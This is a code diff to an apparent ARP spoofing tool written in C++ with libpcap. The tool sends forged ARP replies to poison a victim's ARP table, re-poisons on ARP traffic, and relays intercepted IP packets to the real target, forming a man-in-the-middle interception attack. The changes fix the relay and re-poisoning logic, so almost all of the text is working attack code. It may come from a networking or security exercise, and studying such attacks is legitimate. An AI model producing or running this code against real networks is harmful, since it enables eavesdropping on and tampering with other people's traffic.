@@ -143,7 +143,6 @@ void send_packet(pcap_t* handle,char * sender_ip,char * target_ip,char *my_mac_a
 	packet.arp_.sip_ = htonl(Ip(target_ip));
 	packet.arp_.tmac_ = Mac(sender_mac_addr);
 	packet.arp_.tip_ = htonl(Ip(sender_ip));
-	printf("update sender's arp table\n");
 	for(int i=0;i<3;i++){
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 	if (res != 0) {
@@ -151,9 +150,8 @@ void send_packet(pcap_t* handle,char * sender_ip,char * target_ip,char *my_mac_a
 	}}
 }
 void checking_packet(pcap_t* handle,char *my_mac_addr,char *my_ip,int count){
-	char *dmac = (char *)malloc(sizeof(uint8_t)*20);
-	char *smac = (char *)malloc(sizeof(uint8_t)*20);
 	while(1){
+		int cont_flag = 0;
 		struct pcap_pkthdr* header;
         char *packet;
         int res = pcap_next_ex(handle, &header,(const u_char **) &packet);
@@ -163,27 +161,29 @@ void checking_packet(pcap_t* handle,char *my_mac_addr,char *my_ip,int count){
             break;
         }
 		EthArpPacket *packet1 = (EthArpPacket *) packet;
-		//printf("%x:%x:%x:%x:%x:%x\n",packet1->eth_.dmac_[0],packet1->eth_.dmac_[1],packet1->eth_.dmac_[2],packet1->eth_.dmac_[3],packet1->eth_.dmac_[4],packet1->eth_.dmac_[5],packet1->eth_.dmac_[6]);
 		EthHdr *packet2 = (EthHdr *)packet;
-		//recover packet
 		if((packet1->eth_.type_== htons(EthHdr::Arp))){
 			for(int i=0;i<count;i++){
 				if(packet1->arp_.sip_ == (Ip)htonl(Ip(target_ips[i]))
 				|| packet1->arp_.sip_ == (Ip)htonl(Ip(sender_ips[i]))) {
 					send_packet(handle,sender_ips[i],target_ips[i],my_mac_addr,my_ip);
+					cont_flag = 1;
+					break;
 				}
 
 			}
+			if(cont_flag)
+				continue;
 
 		}
 		else{
-			EthIpPacket *packet2 = (EthIpPacket *) packet;
-			for(int i=0;i<count;i++){				
-				if((packet2->eth_.smac_ == Mac(store_mac[find_index_ip(sender_ips[i])])) &&(packet2->eth_.dmac_ == Mac(my_mac_addr)) &&  (packet2->d_ip == (Ip)htonl(Ip(target_ips[i]))) && (packet2->s_ip == (Ip)htonl(Ip(sender_ips[i]))) ){
+			for(int i=0;i<count;i++){			
+				if((((EthIpPacket *)packet)->eth_.smac_ == Mac(store_mac[find_index_ip(sender_ips[i])])) &&(((EthIpPacket *)packet)->eth_.dmac_ == Mac(my_mac_addr)) && 
+				(((EthIpPacket *)packet)->s_ip == (Ip)htonl(Ip(sender_ips[i]))) ){
 					u_char * relay_packet = (u_char  *)malloc(header->caplen);
 					memcpy(relay_packet,packet,header->caplen);
-					((EthHdr *)relay_packet)-> dmac_ = Mac(store_mac[find_index_ip(target_ips[i])]);
 					((EthHdr *)relay_packet)-> smac_ = Mac(my_mac_addr);
+					((EthHdr *)relay_packet)-> dmac_ = Mac(store_mac[find_index_ip(target_ips[i])]);
 					int res = pcap_sendpacket(handle, relay_packet,header->caplen);
 					printf("send sender's packet\n"); 
 					if (res != 0) {
@@ -191,7 +191,7 @@ void checking_packet(pcap_t* handle,char *my_mac_addr,char *my_ip,int count){
 							}
 					free(relay_packet);
 				}
-
+				break;
 			}
 
 		}
@@ -230,7 +230,7 @@ int main(int argc, char* argv[]) {
 		*(target_ips + (i-1)) = argv[2*i + 1];
 	}
 	for(int i=0;i<argc-2;i++){
-		 index = find_index_ip(argv[i+2]);
+		index = find_index_ip(argv[i+2]);
 		if(index >=0)
 			continue;
 		if(index == -2){
@@ -244,10 +244,11 @@ int main(int argc, char* argv[]) {
 		store_size ++;
 	}
 	//arp_table_change
+
 	for(int i=0;i<cnt;i++){
 		send_packet(handle,*(sender_ips+i),*(target_ips+i),attacker_mac_addr,attacker_ip);
 	}
-  
+	
 	checking_packet(handle,attacker_mac_addr,attacker_ip,cnt);
 	pcap_close(handle);
 }
